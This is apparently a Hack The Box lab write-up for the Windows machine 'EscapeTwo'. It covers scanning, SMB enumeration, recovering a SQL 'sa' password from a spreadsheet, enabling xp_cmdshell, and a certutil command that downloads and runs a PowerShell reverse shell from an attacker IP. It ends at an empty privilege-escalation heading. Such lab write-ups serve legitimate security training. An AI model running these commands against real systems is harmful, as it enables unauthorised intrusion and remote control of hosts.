---
date: 2025-05-25T10:56:05-05:00
# description: ""
image: "/images/HTB-Administrator/EscapeTwo.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: EscapeTwo"
type: "post"
---

* Platform: Hack The Box
* Link: [EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
* Level: Easy
* OS: Windows
---

> We are provided credentials to start on this box for the following account: **Username:** rose **Password:** KxEPkKe6R8su.

## Scanning

```
nmap -sC -sV -Pn -oA nmap/EscapeTwo {IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 15:57 CST
Nmap scan report for 10.129.33.0
Host is up (0.060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-11 21:58:09Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.33.0:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-11T19:22:43
|_Not valid after:  2055-01-11T19:22:43
| ms-sql-ntlm-info: 
|   10.129.33.0:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-11T21:58:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.32 seconds
```

The target is running Active Directory with the usual services such as LDAP, SMB, in additional to Microsoft SQL.

We also have some domain names that we add to the `/etc/hosts` file.

```
sudo echo "TARGET_IP sequel.htb DC01.sequel.htb DC01" | sudo tee -a /etc/hosts
```

## Enumeration

We use the provided credentials to enumerate the available shares.

```
netexec smb TARGET_IP -u rose -p 'KxEPkKe6R8su' --shares
```

![SMB shares enumeration](/images/HTB-EscapeTwo/rose_smb.png)

We have access to some shares let's look into `Accounting Department`. Inside we find two files that we download `accounting_2024.xlsx` and `accounts.xlsx`.

```
smbclient //sequel.htb/'Accounting Department' -U rose
```

![acct dept share access](/images/HTB-EscapeTwo/acc_dpt_share.png)

Inside `accounts.xlsx` we find some files.

![accounts.xlsx file](/images/HTB-EscapeTwo/creds_file.png)

We can read the file `sharedStrings.xml` where we find the credentials for the `sa` account.

> The sa account, or system administrator account, is a built-in account in SQL Server that gives the user full administrative access to the SQL Server instance

![sa account credentials](/images/HTB-EscapeTwo/sa_creds.png)

Using the command below we login into the database.

```
impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb'
```

![mssql login](/images/HTB-EscapeTwo/mssql_login.png)

## Initial Foothold

We enable `xp_cmdshell` with the following queries.

> `xp_cmdshell` is an extended stored procedure in Microsoft SQL Server that allows you to execute operating system commands directly from SQL Server.

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

![enable xp_cmdshell](/images/HTB-EscapeTwo/xp_cmdshell_enabled.png)

We test it with `EXEC xp_cmdshell 'whoami';`. 

![xp_cmdshell test](/images/HTB-EscapeTwo/xp_cmdshell_test.png)

We can now abuse mssql to obtain a reverse shell. On [revshells](https://www.revshells.com/) we use the `PowerShell #3 (Base64)`.

```
xp_cmdshell REVERSE_SHELL_COMMAND
```

![mssql reverse shell](/images/HTB-EscapeTwo/mssql_revshell.png)


```
xp_cmdshell "cmd.exe /c certutil -urlcache -split -f http://10.10.14.146:8000/Invoke-PowerShellTcpOneLine.ps1 shell.ps1 && shell.ps1"
```


## Privilege Escalation


